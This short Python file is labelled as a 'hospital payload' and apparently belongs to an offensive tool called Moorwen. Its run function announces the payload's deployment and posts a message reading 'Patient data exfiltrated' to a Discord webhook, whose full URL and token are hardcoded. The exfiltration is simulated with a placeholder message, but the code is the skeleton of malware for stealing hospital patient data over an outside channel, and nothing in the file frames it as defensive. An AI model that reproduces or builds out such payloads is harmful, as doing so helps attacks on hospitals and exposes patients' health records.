# ============================================================
# MOORWEN — HOSPITAL PAYLOAD
# ============================================================

import requests
import json

def run():
    print("[*] Hospital payload deployed.")
    # Simulate patient data exfil
    webhook = "https://discord.com/api/webhooks/1541184615719374990/ij1wnF8bf0CULSDYZKUyIEkWWKn7whlClnq9fMa8vGHHEPVanQyUn8WwIiXogfHsx3go"
    data = {"message": "Patient data exfiltrated"}
    requests.post(webhook, json={"content": json.dumps(data)})
